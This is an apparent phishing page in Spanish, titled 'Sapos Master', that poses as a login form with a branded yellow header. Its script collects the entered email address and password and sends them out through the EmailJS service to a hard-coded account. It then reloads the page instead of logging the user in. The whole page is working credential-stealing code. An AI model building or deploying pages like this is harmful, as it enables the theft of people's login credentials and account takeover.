<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Sapos Master</title>
<link rel="manifest" href="manifest.json">

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Arial;
}

body {
  height: 100vh;
  background: #ffffff;
  display: flex;
  justify-content: center;
  align-items: center;
}

/* FRANJA AMARILLA */
.top-bar {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 200px;
  background: #FFE600;
  display: flex;
  justify-content: center;
  align-items: center;
}

/* LOGO */
.top-bar img {
  width: 300px;
}

/* CONTENEDOR */
.container {
  background: white;
  padding: 30px;
  border-radius: 10px;
  width: 300px;
  text-align: center;
  box-shadow: 0 5px 15px rgba(0,0,0,0.2);
  margin-top: 120px;
}

/* TITULO */
h1 {
  color: #000;
  margin-bottom: 20px;
}

/* INPUTS */
.input-box {
  position: relative;
  margin: 20px 0;
}

.input-box input {
  width: 100%;
  padding: 10px;
  border: 1px solid #ccc;
  border-radius: 5px;
}

.input-box label {
  position: absolute;
  top: -10px;
  left: 5px;
  background: white;
  font-size: 12px;
  color: #555;
  padding: 0 5px;
}

/* BOTÓN */
button {
  margin-top: 20px;
  padding: 12px;
  width: 100%;
  border: none;
  border-radius: 5px;
  background: #FFD700;
  color: black;
  font-size: 16px;
  cursor: pointer;
  font-weight: bold;
}

button:hover {
  background: #e6c200;
}

/* MENSAJE */
#mensaje {
  margin-top: 15px;
  color: #333;
}
</style>
</head>

<body>

<div class="top-bar">
  <img src="logo.png">
</div>

<div class="container">
  <h1>Iniciar sesión</h1>

  <div class="input-box">
    <input type="email" id="correo" required>
    <label>Correo</label>
  </div>

  <div class="input-box">
    <input type="password" id="codigo" required>
    <label>Contraseña</label>
  </div>

  <button onclick="enviar()">Iniciar</button>
  <p id="mensaje"></p>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){
  emailjs.init("a8oPFnNC1H4mNlDzC");
})();

function enviar() {
  let correo = document.getElementById("correo").value.trim();
  let codigo = document.getElementById("codigo").value.trim();

  if (!correo || !codigo) {
    document.getElementById("mensaje").innerText = "Completa los campos";
    return;
  }

  let datos = {
    email: correo,
    code: codigo
  };

  emailjs.send("service_2ukrjlv", "template_7347e2j", datos)
  .then(function(response) {
     console.log("OK:", response);
     document.getElementById("mensaje").innerText = "Enviado correctamente ✔";

     setTimeout(() => {
        location.reload();
     }, 2000);

  }, function(error) {
     console.log("ERROR:", error);
     document.getElementById("mensaje").innerText = "Error al enviar ❌";
  });
}
</script>

</body>
</html>
